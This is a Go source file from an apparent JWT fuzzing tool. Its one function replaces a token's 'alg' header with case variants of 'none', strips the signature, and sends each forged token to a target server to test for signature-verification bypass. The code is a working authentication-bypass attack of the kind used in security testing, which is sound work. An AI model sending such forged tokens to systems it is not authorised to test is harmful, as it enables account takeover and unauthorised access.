package cmd

import (
	"fmt"
	"time"

	"github.com/malsuke/jwt-fuzzer/internal/request"
)

func (j *JWT) algo(alg string) {
	j.Header.Alg = alg
	j.Signature = ""
}

func algoTest(client request.Client, jwt JWT) error {
	pattern := []string{"None", "none", "NONE", "nOnE"}

	for _, alg := range pattern {
		jwt.algo(alg)
		body := jwt.EncodeToString()

		fmt.Printf("\033[31mTEST\033[0m 'alg' = '%s'\n", alg)
		fmt.Printf("[+] %s\n", body)

		request.RequestWithJWT(client, body)
		time.Sleep(1 * time.Second)
	}
	return nil
}
